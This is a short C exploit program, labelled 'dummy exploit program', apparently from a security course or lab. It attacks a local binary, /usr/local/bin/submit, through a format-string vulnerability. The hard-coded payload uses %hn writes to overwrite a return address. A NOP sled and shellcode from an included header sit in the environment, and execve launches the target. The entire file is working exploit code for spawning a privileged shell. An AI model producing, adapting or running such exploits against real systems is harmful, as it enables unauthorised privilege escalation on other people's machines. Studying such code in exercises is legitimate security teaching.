/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/usr/local/bin/submit"
#define FORMATSTRING "     \x3c\xdd\xbf\xff\x3e\xdd\xbf\xff%57091x%116$hn%8367x%117$hn"
int main( void )
{

  
  char *args[ 4 ];
  char *env[ 1 ];
  long *a;
  char fileinput[ 300 ];
  long *retaddr = ( long * ) 0xffbfdf00;
  int i = strlen( shellcode );
  
  memset( fileinput, 0x90, 105 );

  a = fileinput + 105;
  
  memcpy( a, shellcode, i );
  
  args[ 0 ] = TARGET; args[ 1 ] = FORMATSTRING;
  args[ 2 ] = NULL; args[ 3 ] = NULL;

  env[ 0 ] = fileinput;

  if ( execve( TARGET, args, env ) < 0 )
    fprintf( stderr, "execve failed.\n" );

  exit( 0 );
}
